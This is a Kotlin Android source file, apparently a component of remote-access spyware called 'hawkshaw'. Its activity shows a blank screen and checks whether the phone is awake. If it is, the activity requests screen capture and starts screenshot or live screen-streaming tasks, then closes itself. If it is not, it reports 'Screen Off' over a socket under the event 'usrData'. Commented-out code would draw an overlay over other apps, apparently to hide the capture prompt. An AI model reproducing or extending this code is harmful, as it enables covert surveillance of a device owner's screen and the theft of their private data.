package me.hawkshaw.activities

import android.app.Activity
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.PowerManager
import android.provider.Settings
import android.view.Gravity
import android.view.LayoutInflater
import android.view.WindowManager
import android.widget.LinearLayout
import android.widget.Toast
import me.hawkshaw.R
import me.hawkshaw.tasks.TakeScreenShot
import android.widget.TextView
import me.hawkshaw.tasks.StreamScreen
import me.hawkshaw.utils.Constants
import org.json.JSONObject

class ScreenProjectionActivity : Activity() {

    private val li by lazy { getSystemService(Service.LAYOUT_INFLATER_SERVICE) as LayoutInflater }
    private val view by lazy { li.inflate(R.layout.overlay_1, LinearLayout(this)) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val tv = TextView(this)
        tv.text = ""
        setContentView(tv)

        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (powerManager.isInteractive) screenCast()
        else {
            val obj = JSONObject()
            obj.put("name", "Screen Off")
            obj.put("image64", "null")
            obj.put("dataType", "downloadImage")
            Constants.socket?.emit("usrData", obj)
            super.onBackPressed()
        }
    }

    private fun screenCast() {
        val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mgr.createScreenCaptureIntent(), 7575)
        //drawOverOtherApps()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        //windowManager.removeView(view)
        if (requestCode == 7575 && resultCode == RESULT_OK)
            if (intent.getBooleanExtra("streamScreen", false)) StreamScreen(applicationContext, Handler(), resultCode, data).start()
            else TakeScreenShot(applicationContext, Handler(), resultCode, data).start()

        super.onBackPressed()
    }

    private fun drawOverOtherApps() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Toast.makeText(this, "Draw Over other apps is not enabled", Toast.LENGTH_SHORT).show()
        } else
            draw()

    }

    private fun draw() {

        val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT)


        params.gravity = Gravity.BOTTOM
        params.y = 395
        params.x = 50

        windowManager.addView(view, params)
    }

}
